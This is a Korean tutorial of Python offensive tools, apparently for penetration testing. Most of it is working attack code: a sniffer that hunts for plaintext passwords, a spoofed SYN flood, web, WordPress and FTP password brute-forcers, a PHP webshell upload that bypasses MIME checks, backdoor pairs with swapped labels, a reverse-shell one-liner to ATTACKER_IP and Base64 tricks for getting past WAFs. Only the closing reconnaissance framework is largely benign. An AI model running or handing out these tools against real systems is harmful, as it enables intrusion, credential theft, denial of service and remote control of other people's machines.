# 파이썬 해킹 도구 개발 — 실전 30가지 예제

## 1. 파이썬 기초 (해킹 관점)

### 모듈 구조
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 표준 라이브러리
import socket
import os
import sys
import subprocess
import threading
import struct
import time

# 해킹 도구에서 자주 사용하는 라이브러리
# pip install requests scapy pwntools paramiko
import requests
from scapy.all import *
from pwn import *
import paramiko
```

### 클래스 기반 구조
```python
class NetworkScanner:
    def __init__(self, target, port_range=(1, 1024)):
        self.target = target
        self.start_port, self.end_port = port_range
        self.open_ports = []
    
    def scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((self.target, port))
            if result == 0:
                self.open_ports.append(port)
            s.close()
        except socket.error:
            pass
    
    def run(self):
        threads = []
        for port in range(self.start_port, self.end_port + 1):
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return sorted(self.open_ports)

# 사용
scanner = NetworkScanner("192.168.1.1", (1, 1024))
print(scanner.run())
```

---

## 2. 네트워크 도구

### 예제 1: 포트 스캐너 (nmap 라이브러리)
```python
import nmap

def port_scan(target, ports="1-1024"):
    nm = nmap.PortScanner()
    nm.scan(target, ports)
    
    for host in nm.all_hosts():
        print(f"Host: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")
        
        for proto in nm[host].all_protocols():
            print(f"Protocol: {proto}")
            port_list = sorted(nm[host][proto].keys())
            
            for port in port_list:
                state = nm[host][proto][port]['state']
                service = nm[host][proto][port].get('name', 'unknown')
                version = nm[host][proto][port].get('version', '')
                print(f"  {port}/{proto} {state} {service} {version}")

port_scan("192.168.1.0/24", "22,80,443,3306,8080")
```

### 예제 2: TCP 포트 스캐너 (소켓)
```python
import socket
import threading
from queue import Queue

def scan_worker(q, results, lock):
    while not q.empty():
        host, port = q.get()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((host, port)) == 0:
                try:
                    banner = s.recv(1024).decode(errors='ignore').strip()
                except:
                    banner = ""
                with lock:
                    results.append((port, banner))
            s.close()
        except:
            pass
        finally:
            q.task_done()

def fast_port_scan(host, ports=range(1, 10001), threads=200):
    q = Queue()
    results = []
    lock = threading.Lock()
    
    for port in ports:
        q.put((host, port))
    
    for _ in range(min(threads, len(ports))):
        t = threading.Thread(target=scan_worker, args=(q, results, lock))
        t.daemon = True
        t.start()
    
    q.join()
    return sorted(results)

# 실행
print(f"[*] Scanning 192.168.1.1...")
open_ports = fast_port_scan("192.168.1.1", range(1, 1025))
for port, banner in open_ports:
    print(f"[+] Port {port} OPEN" + (f" | {banner[:50]}" if banner else ""))
```

### 예제 3: 패킷 스니퍼 (평문 자격증명 탈취)
```python
import socket
import string

def packet_sniffer():
    HOST = socket.gethostbyname(socket.gethostname())
    
    # Raw 소켓 (관리자 권한 필요)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    s.bind((HOST, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  # Windows
    
    keywords = ["USER", "PASS", "password", "login", "230 User logged in"]
    
    print("[*] Sniffing started... (Ctrl+C to stop)")
    while True:
        try:
            data = s.recvfrom(65565)
            raw = data[0]
            
            # 출력 가능한 문자만 파싱
            printable = set(string.printable)
            parsed = ''.join(chr(b) if chr(b) in printable else '.' 
                           for b in raw)
            
            for keyword in keywords:
                if keyword in parsed:
                    print(f"\n[!] Found keyword '{keyword}':")
                    print(parsed[:200])
                    break
        except KeyboardInterrupt:
            break
    
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
    s.close()

packet_sniffer()
```

### 예제 4: TCP SYN Flood (DoS 공격 — 학습 및 방어 이해용)
```python
import socket
import struct
import random

def calculate_checksum(data):
    """체크섬 계산"""
    s = 0
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            w = (data[i] << 8) + data[i + 1]
        else:
            w = data[i] << 8
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_ip_header(src_ip, dst_ip):
    """IP 헤더 생성"""
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 40
    id = random.randint(0, 65535)
    flags_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    checksum = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    
    header = struct.pack('!BBHHHBBH4s4s',
                        version_ihl, tos, total_length, id, flags_offset,
                        ttl, protocol, checksum, src, dst)
    return header

def create_tcp_header(src_port, dst_port, src_ip, dst_ip):
    """TCP SYN 헤더 생성"""
    seq = random.randint(0, 2**32 - 1)
    ack = 0
    data_offset = (5 << 4)
    flags = 0x02  # SYN 플래그
    window = socket.htons(29200)
    checksum = 0
    urgent = 0
    
    # 가체크섬으로 실제 체크섬 계산
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port, seq, ack,
                            data_offset, flags, window, checksum, urgent)
    
    # 유사 헤더 (체크섬 계산용)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, socket.IPPROTO_TCP, len(tcp_header))
    
    checksum = calculate_checksum(pseudo + tcp_header)
    
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port, seq, ack,
                            data_offset, flags, window, checksum, urgent)
    return tcp_header

# 학습 목적: 실제 공격에 사용 금지
def syn_flood_demo(dst_ip, dst_port=80, count=10):
    """SYN Flood 데모 (허가된 환경에서만)"""
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    for i in range(count):
        # 랜덤 소스 IP (IP 스푸핑)
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        ip_header  = create_ip_header(src_ip, dst_ip)
        tcp_header = create_tcp_header(src_port, dst_port, src_ip, dst_ip)
        
        packet = ip_header + tcp_header
        s.sendto(packet, (dst_ip, 0))
        print(f"[{i+1}] Sent SYN from {src_ip}:{src_port} → {dst_ip}:{dst_port}")
    
    s.close()
```

---

## 3. 웹 해킹 자동화

### 예제 5: 웹 로그인 크래커 (딕셔너리 공격)
```python
import requests

def web_login_crack(target_url, username, wordlist_path):
    """웹 로그인 딕셔너리 공격 (허가된 시스템에서만)"""
    
    session = requests.Session()
    
    # 로그인 성공 시 리다이렉트 URL (사전에 확인 필요)
    success_indicator = "dashboard"  # 성공 시 포함되는 키워드
    
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            
            payload = {
                'username': username,
                'password': password,
                'submit': 'Login'
            }
            
            try:
                response = session.post(target_url, data=payload, 
                                       timeout=5, allow_redirects=True)
                
                if success_indicator in response.url or \
                   success_indicator in response.text:
                    print(f"[+] SUCCESS! Password: {password}")
                    return password
                else:
                    print(f"[-] Failed: {password}")
            
            except requests.exceptions.RequestException as e:
                print(f"[!] Error: {e}")
                continue
    
    print("[-] Password not found in wordlist")
    return None

# WordPress 특화
def wordpress_crack(site_url, username, wordlist_path):
    """WordPress 로그인 크래커"""
    login_url = f"{site_url}/wp-login.php"
    
    with open(wordlist_path, 'r', errors='ignore') as f:
        for password in f:
            password = password.strip()
            
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log+In',
                'redirect_to': '/wp-admin/',
                'testcookie': '1'
            }
            
            cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}
            
            r = requests.post(login_url, data=data, cookies=cookies, 
                             allow_redirects=False)
            
            if 'wp-admin' in r.headers.get('Location', ''):
                print(f"[+] Found: {username}:{password}")
                return password
            else:
                print(f"[-] {password}")
```

### 예제 6: 웹 파일 업로드 공격
```python
import requests

def upload_webshell(upload_url, shell_path, shell_name="shell.php"):
    """파일 업로드 취약점으로 웹셸 업로드"""
    
    webshell_content = b'<?php system($_GET["cmd"]); ?>'
    
    # 파일 타입 헤더 조작 (MIME 우회)
    files = {
        'file': (shell_name, webshell_content, 'image/jpeg')
    }
    
    # Content-Type 우회 시도
    for content_type in ['image/jpeg', 'image/png', 'image/gif']:
        try:
            r = requests.post(upload_url, files=files)
            print(f"Status: {r.status_code}")
            print(f"Response: {r.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")

def use_webshell(webshell_url, command):
    """업로드된 웹셸로 명령 실행"""
    r = requests.get(webshell_url, params={'cmd': command})
    return r.text

# 사용 예시
# use_webshell("http://target.com/uploads/shell.php", "id")
# use_webshell("http://target.com/uploads/shell.php", "cat /etc/passwd")
```

### 예제 7: 디렉토리 열거 (Directory Listing)
```python
import requests
import threading
from queue import Queue

def directory_bruteforce(base_url, wordlist_path, threads=50, 
                         extensions=['', '.php', '.html', '.txt', '.bak']):
    """웹 디렉토리/파일 브루트포서"""
    
    q = Queue()
    found = []
    
    with open(wordlist_path, 'r') as f:
        for word in f:
            word = word.strip()
            for ext in extensions:
                q.put(word + ext)
    
    def worker():
        while not q.empty():
            path = q.get()
            url = f"{base_url}/{path}"
            
            try:
                r = requests.get(url, timeout=3, allow_redirects=False)
                if r.status_code == 200:
                    print(f"[200] {url}")
                    found.append(url)
                elif r.status_code in [301, 302]:
                    print(f"[{r.status_code}] {url} → {r.headers.get('Location', '')}")
                elif r.status_code == 403:
                    print(f"[403] {url} (Forbidden — exists but blocked)")
                    found.append(url)
            except:
                pass
            finally:
                q.task_done()
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    q.join()
    return found

# 사용
# found = directory_bruteforce("http://target.com", "/usr/share/wordlists/dirb/common.txt")
```

---

## 4. 백도어 및 리버스 쉘

### 예제 8: 백도어 서버 (피공격자 머신)
```python
# backdoor_server.py (공격 대상 머신에서 실행)
from socket import *

def backdoor_server(host='', port=11443):
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(10)
    
    print(f"[*] Listening on port {port}...")
    
    conn, addr = s.accept()
    print(f"[*] Connected from {addr}")
    
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        
        if command.lower() == "quit":
            break
        
        response = conn.recv(4096).decode()
        print(response)
    
    conn.close()
    s.close()

backdoor_server()
```

### 예제 9: 백도어 클라이언트 (공격자 머신에서 제어)
```python
# backdoor_client.py (공격자 제어 머신에서 실행)
import socket
import subprocess

def backdoor_client(host, port=11443):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(b'[*] Connection Established!')
    
    while True:
        data = s.recv(1024).decode()
        
        if data.lower() == "quit":
            break
        
        # 명령어 실행
        proc = subprocess.Popen(
            data, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        stdout = proc.stdout.read()
        stderr = proc.stderr.read()
        s.send(stdout + stderr)
    
    s.close()

backdoor_client("192.168.1.100")
```

### 예제 10: Python 리버스 쉘 (한 줄 버전)
```python
# 리버스 쉘 (대상 머신에서 실행)
# 공격자 머신: nc -lvnp 4444
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

---

## 5. FTP 크랙 (멀티스레드)

### 예제 11: FTP 브루트포서
```python
import ftplib
import threading
from queue import Queue

class FTPCracker:
    def __init__(self, host, user, wordlist, threads=10):
        self.host = host
        self.user = user
        self.wordlist = wordlist
        self.threads = threads
        self.found = False
        self.password = None
        self.q = Queue()
    
    def try_login(self, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, 21, timeout=5)
            ftp.login(self.user, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False
    
    def worker(self):
        while not self.q.empty() and not self.found:
            password = self.q.get()
            
            if self.try_login(password):
                self.found = True
                self.password = password
                print(f"[+] SUCCESS! {self.user}:{password}")
            else:
                print(f"[-] {password}")
            
            self.q.task_done()
    
    def run(self):
        with open(self.wordlist, 'r', errors='ignore') as f:
            for line in f:
                self.q.put(line.strip())
        
        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        self.q.join()
        return self.password

# cracker = FTPCracker("192.168.1.100", "admin", "wordlist.txt", threads=20)
# cracker.run()
```

---

## 6. 레지스트리 및 시스템 해킹

### 예제 12: 레지스트리 사용자 목록 추출
```python
import winreg  # Windows 전용

def get_registry_users():
    """레지스트리에서 사용자 목록 추출"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
        )
        
        i = 0
        users = []
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                
                try:
                    profile_path = winreg.QueryValueEx(subkey, "ProfileImagePath")[0]
                    username = profile_path.split("\\")[-1]
                    users.append({
                        'SID': subkey_name,
                        'Username': username,
                        'Path': profile_path
                    })
                except WindowsError:
                    pass
                
                winreg.CloseKey(subkey)
                i += 1
            except WindowsError:
                break
        
        winreg.CloseKey(key)
        return users
    
    except Exception as e:
        print(f"Error: {e}")
        return []

# users = get_registry_users()
# for u in users:
#     print(f"SID: {u['SID']}, User: {u['Username']}")
```

### 예제 13: 방화벽 레지스트리 확인
```python
import winreg

def check_firewall_status():
    """Windows 방화벽 상태 레지스트리로 확인"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
        )
        
        enabled = winreg.QueryValueEx(key, "EnableFirewall")[0]
        print(f"Firewall Enabled: {bool(enabled)}")
        
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Error: {e}")

check_firewall_status()
```

---

## 7. 퍼징 (Fuzzing)

### 예제 14: 기본 퍼저
```python
# 버퍼 오버플로우 취약점 탐지용 퍼저
import socket
import time

def fuzzer(host, port, payload_size=100, increment=100, max_size=10000):
    """TCP 서비스 퍼저"""
    
    size = payload_size
    
    while size <= max_size:
        try:
            payload = b"A" * size
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            
            # 배너 수신
            banner = s.recv(1024)
            
            # 페이로드 전송
            s.send(payload)
            
            try:
                response = s.recv(1024)
                print(f"[*] Sent {size} bytes - Server responded")
            except:
                print(f"[!] Sent {size} bytes - No response (possible crash!)")
            
            s.close()
            time.sleep(0.1)
        
        except ConnectionRefusedError:
            print(f"[CRASH?] {size} bytes sent — Connection refused!")
            print("[!] Server may have crashed!")
            break
        except Exception as e:
            print(f"[!] {size} bytes — Error: {e}")
            break
        
        size += increment

# fuzzer("192.168.1.100", 21, payload_size=200, increment=200)
```

### 예제 15: 바이너리 퍼저 (파일 기반)
```python
import os
import random
import subprocess

def file_fuzzer(target_binary, seed_file, iterations=1000):
    """파일 파서 취약점 탐지 퍼저"""
    
    with open(seed_file, 'rb') as f:
        seed_data = bytearray(f.read())
    
    for i in range(iterations):
        # 랜덤 변이
        fuzzed = bytearray(seed_data)
        
        # 변이 전략 선택
        strategy = random.choice(['bit_flip', 'byte_replace', 'insert', 'delete'])
        
        if strategy == 'bit_flip' and fuzzed:
            idx = random.randint(0, len(fuzzed) - 1)
            fuzzed[idx] ^= (1 << random.randint(0, 7))
        
        elif strategy == 'byte_replace' and fuzzed:
            idx = random.randint(0, len(fuzzed) - 1)
            fuzzed[idx] = random.randint(0, 255)
        
        elif strategy == 'insert':
            idx = random.randint(0, len(fuzzed))
            fuzzed.insert(idx, random.randint(0, 255))
        
        elif strategy == 'delete' and len(fuzzed) > 1:
            idx = random.randint(0, len(fuzzed) - 1)
            del fuzzed[idx]
        
        # 임시 파일 저장
        fuzz_file = f"/tmp/fuzz_{i}.bin"
        with open(fuzz_file, 'wb') as f:
            f.write(fuzzed)
        
        # 대상 프로그램 실행
        try:
            result = subprocess.run(
                [target_binary, fuzz_file],
                timeout=5,
                capture_output=True
            )
            
            # 크래시 탐지 (시그널로 종료)
            if result.returncode < 0:
                print(f"[CRASH!] Iteration {i}: returncode={result.returncode}")
                print(f"  Fuzz file saved: {fuzz_file}")
                # 크래시 파일은 보존
                continue
        
        except subprocess.TimeoutExpired:
            print(f"[HANG?] Iteration {i}: Timeout")
        
        except Exception as e:
            print(f"[ERROR] Iteration {i}: {e}")
        
        # 크래시 아니면 임시 파일 삭제
        if os.path.exists(fuzz_file):
            os.remove(fuzz_file)
        
        if i % 100 == 0:
            print(f"Progress: {i}/{iterations}")

# file_fuzzer("./vulnerable_parser", "sample.pdf")
```

---

## 8. API 후킹 (Windows)

### 예제 16: Message Hook (키로거 원리)
```python
# pywin32 필요: pip install pywin32
import win32api
import win32con
import win32gui
import ctypes

# 키로거 원리 이해용 코드
class KeyLogger:
    def __init__(self):
        self.log = []
        
    def _low_level_handler(self, nCode, wParam, lParam):
        """키보드 훅 콜백"""
        if wParam == win32con.WM_KEYDOWN:
            vk_code = lParam[0]
            key = chr(vk_code) if 32 <= vk_code < 128 else f"[{vk_code}]"
            self.log.append(key)
            print(f"Key: {key}", end="", flush=True)
        
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, ctypes.byref(ctypes.c_void_p(lParam)))
    
    def start(self):
        """키보드 훅 시작 (개념 이해용)"""
        print("[*] Keylogger started (Press Ctrl+C to stop)")
        # 실제 구현은 SetWindowsHookEx 사용
        # 이 코드는 개념 이해를 위한 구조만 표현
```

---

## 9. 암호화/복호화

### 예제 17: XOR 암호화 (간단한 난독화)
```python
def xor_encrypt(data, key):
    """XOR 암호화/복호화 (같은 키로 역연산 가능)"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    
    return bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])

def xor_decrypt(encrypted, key):
    """XOR 복호화 (암호화와 동일)"""
    return xor_encrypt(encrypted, key)

# 사용
plaintext = "Hello, World! This is secret."
key = "secretkey"

encrypted = xor_encrypt(plaintext, key)
print(f"Encrypted: {encrypted.hex()}")

decrypted = xor_decrypt(encrypted, key).decode()
print(f"Decrypted: {decrypted}")
```

### 예제 18: Base64 인코딩/디코딩 (페이로드 우회)
```python
import base64

# 셸코드/페이로드 Base64 인코딩으로 WAF 우회
payload = "whoami"
encoded = base64.b64encode(payload.encode()).decode()
print(f"Encoded: {encoded}")  # d2hvYW1p

# 디코딩 후 실행
decoded = base64.b64decode(encoded).decode()
print(f"Decoded: {decoded}")

# 다중 인코딩 (WAF 우회)
double_encoded = base64.b64encode(
    base64.b64encode(payload.encode())
).decode()
print(f"Double encoded: {double_encoded}")

# URL 안전 Base64
url_safe = base64.urlsafe_b64encode(payload.encode()).decode()
print(f"URL-safe: {url_safe}")
```

---

## 10. 통합 해킹 프레임워크 구조

```python
#!/usr/bin/env python3
"""
모의해킹 자동화 프레임워크 (Python 3.10+)
용도: 정찰 → 스캔 → 취약점 분석 → 보고서 생성 파이프라인 구조화
사용법: python3 pentest_framework.py <target> [--phase recon|scan|all]
의존성: pip install requests dnspython
"""
from __future__ import annotations
import argparse
import json
import socket
import sys
import threading
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from queue import Queue
from typing import Callable


# ─── 데이터 모델 ────────────────────────────────────────────────

@dataclass
class Finding:
    phase: str
    severity: str    # CRITICAL / HIGH / MEDIUM / LOW / INFO
    title: str
    detail: str
    evidence: str = ""

    def __str__(self) -> str:
        return f"[{self.severity:8s}] {self.title}: {self.detail}"


@dataclass
class EngagementResult:
    target: str
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
    end_time: str = ""
    open_ports: list[tuple[int, str]] = field(default_factory=list)
    dns_records: dict[str, list[str]] = field(default_factory=dict)
    findings: list[Finding] = field(default_factory=list)

    def add_finding(self, *args, **kwargs) -> None:
        self.findings.append(Finding(*args, **kwargs))

    def summary(self) -> dict:
        counts: dict[str, int] = defaultdict(int)
        for f in self.findings:
            counts[f.severity] += 1
        return dict(counts)


# ─── 정찰 모듈 ──────────────────────────────────────────────────

def recon_dns(target: str, result: EngagementResult) -> None:
    """DNS 레코드 수집 (A, MX, NS, TXT)."""
    try:
        import dns.resolver  # pip install dnspython
        for rtype in ("A", "MX", "NS", "TXT"):
            try:
                answers = dns.resolver.resolve(target, rtype, lifetime=5)
                result.dns_records[rtype] = [str(r) for r in answers]
            except Exception:
                pass
        if result.dns_records:
            result.add_finding("RECON", "INFO", "DNS 레코드 수집",
                               f"{target}", json.dumps(result.dns_records))
    except ImportError:
        # dnspython 없을 때 기본 조회
        try:
            ip = socket.gethostbyname(target)
            result.dns_records["A"] = [ip]
            result.add_finding("RECON", "INFO", "DNS A 레코드", target, ip)
        except socket.gaierror:
            pass


def recon_whois(target: str, result: EngagementResult) -> None:
    """Whois 조회 (python-whois 있을 때)."""
    try:
        import whois  # pip install python-whois
        w = whois.whois(target)
        detail = f"등록자: {w.registrant_name}  등록일: {w.creation_date}"
        result.add_finding("RECON", "INFO", "Whois 조회", target, detail)
    except Exception:
        pass


# ─── 스캔 모듈 ──────────────────────────────────────────────────

def scan_ports(
    target: str,
    result: EngagementResult,
    ports: list[int] | None = None,
    n_threads: int = 200,
    timeout: float = 0.8,
) -> None:
    """멀티스레드 TCP 포트 스캐너."""
    port_list = ports or list(range(1, 1025))
    q: Queue[int] = Queue()
    for p in port_list:
        q.put(p)
    lock = threading.Lock()

    def worker() -> None:
        while not q.empty():
            port = q.get()
            try:
                with socket.create_connection((target, port), timeout=timeout) as s:
                    banner = b""
                    try:
                        s.settimeout(0.5)
                        banner = s.recv(256)
                    except Exception:
                        pass
                    svc = banner.decode("utf-8", errors="replace").strip()[:50]
                    with lock:
                        result.open_ports.append((port, svc))
            except (socket.timeout, ConnectionRefusedError, OSError):
                pass
            finally:
                q.task_done()

    threads = [threading.Thread(target=worker, daemon=True)
               for _ in range(min(n_threads, len(port_list)))]
    for t in threads:
        t.start()
    q.join()
    result.open_ports.sort()


def scan_http_headers(target: str, port: int, result: EngagementResult) -> None:
    """HTTP 보안 헤더 점검."""
    try:
        import requests
        import urllib3
        urllib3.disable_warnings()
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{target}:{port}"
        resp = requests.get(url, timeout=8, verify=False,
                            headers={"User-Agent": "Mozilla/5.0"})
        missing = [
            h for h in [
                "Strict-Transport-Security", "X-Frame-Options",
                "X-Content-Type-Options", "Content-Security-Policy",
            ]
            if h not in resp.headers
        ]
        if missing:
            result.add_finding(
                "SCAN", "MEDIUM", "보안 헤더 누락",
                f"{url}",
                "누락: " + ", ".join(missing),
            )
        server = resp.headers.get("Server", "")
        if server:
            result.add_finding("SCAN", "INFO", "서버 버전 노출", url, server)
    except Exception:
        pass


def scan_ftp_anonymous(target: str, result: EngagementResult) -> None:
    """FTP 익명 로그인 점검."""
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(target, 21, timeout=5)
        ftp.login("anonymous", "anon@test.com")
        ftp.quit()
        result.add_finding("SCAN", "HIGH", "FTP 익명 로그인 허용",
                           f"{target}:21", "anonymous/anon@test.com 로그인 성공")
    except Exception:
        pass


# ─── 보고서 모듈 ─────────────────────────────────────────────────

def generate_report(result: EngagementResult, output_path: str = "report.json") -> None:
    result.end_time = datetime.now().isoformat()
    data = asdict(result)
    Path(output_path).write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"[+] 보고서 저장: {output_path}")


# ─── 프레임워크 진입점 ───────────────────────────────────────────

class PentestFramework:
    PHASES: dict[str, list[Callable]] = {
        "recon": [recon_dns, recon_whois],
        "scan":  [scan_ports],
    }

    def __init__(self, target: str) -> None:
        self.target = target
        self.result = EngagementResult(target=target)

    def run(self, phases: list[str] = ("recon", "scan")) -> EngagementResult:
        print(f"[*] 대상: {self.target}")
        for phase_name in phases:
            funcs = self.PHASES.get(phase_name, [])
            print(f"\n[Phase: {phase_name.upper()}]")
            for fn in funcs:
                print(f"  [+] {fn.__name__}")
                fn(self.target, self.result)

        # 포트 스캔 후 서비스별 추가 점검
        if "scan" in phases:
            for port, _ in self.result.open_ports:
                print(f"  [+] 포트 {port} 서비스 점검")
                if port in (80, 443, 8080, 8443):
                    scan_http_headers(self.target, port, self.result)
                elif port == 21:
                    scan_ftp_anonymous(self.target, self.result)

        print(f"\n[결과 요약]  열린 포트: {len(self.result.open_ports)}개")
        for port, banner in self.result.open_ports:
            print(f"  {port:5d}/tcp  {banner[:60]}")

        print(f"\n[발견사항]  {self.result.summary()}")
        for f in self.result.findings:
            print(f"  {f}")

        return self.result


def main() -> None:
    parser = argparse.ArgumentParser(description="모의해킹 자동화 프레임워크")
    parser.add_argument("target", help="대상 호스트명 또는 IP")
    parser.add_argument(
        "--phase", nargs="+",
        choices=["recon", "scan", "all"], default=["all"],
        help="실행할 단계 (기본값: all)",
    )
    parser.add_argument("--output", default="pentest_report.json", help="보고서 파일 경로")
    args = parser.parse_args()

    phases = ["recon", "scan"] if "all" in args.phase else args.phase
    fw = PentestFramework(args.target)
    result = fw.run(phases)
    generate_report(result, args.output)


if __name__ == "__main__":
    main()
```
